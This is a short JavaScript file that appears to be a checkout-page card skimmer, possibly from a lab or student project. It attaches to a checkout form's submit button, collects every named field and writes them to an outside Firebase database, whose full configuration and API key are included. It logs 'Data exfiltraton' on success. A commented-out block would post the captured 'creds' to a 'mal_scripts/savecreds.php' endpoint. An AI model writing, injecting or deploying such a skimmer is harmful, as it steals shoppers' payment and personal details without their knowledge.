// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.8.0/firebase-database.js";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyAsTsY61OzOBJlH5VdiUVkRdUGrtInAheI",
  authDomain: "xxs-9b29d.firebaseapp.com",
  databaseURL: "https://xxs-9b29d-default-rtdb.firebaseio.com",
  projectId: "xxs-9b29d",
  storageBucket: "xxs-9b29d.firebasestorage.app",
  messagingSenderId: "819456939608",
  appId: "1:819456939608:web:6f8efa699f894a91369c2d",
  measurementId: "G-LG40VELJ1Y"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

checkoutForm.querySelector('button[type="submit"]').addEventListener('click', function(event) {
    
     const formElements = document.getElementById('checkout-form-content');
 
     // Initialize an object to store name-value pairs
     const formData = {};

    // console.log(new FormData(formElements));
     // Loop through all form elements
     for (let element of formElements) {
         if (element.name) { // Only process elements that have a name attribute
             formData[element.name] = element.value;
         }
     }

     const reference = ref(database, path)

     set(reference, formData)
     .then(() => {
         console.log("Data exfiltraton to Firebase successful!");
     })
     .catch((error) => {
         console.error("Error sending data:", error);
     });
 
     // Format data into a string for the text file (creds.txt)
     //let credsText = 'Payment Information:\n';
    /* for (let key in formData) {
         creds += `${key}: ${formData[key]}\n`;
     }*/
     
 
     // Send the data to the server to generate the text file
    /* fetch('http://localhost/project/mal_scripts/savecreds.php', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
         },
         body: JSON.stringify({ credsText: credsText })
     })
     .then(response => response.json())
     .then(data => {
         if (data.success) {
             console.log('Order data has been saved.');
         } else {
             console.log('There was an error saving your data.');
         }
     })
     .catch(error => {
         console.error('Error:', error);
         console.log('There was an error processing your request.');
     });*/
 });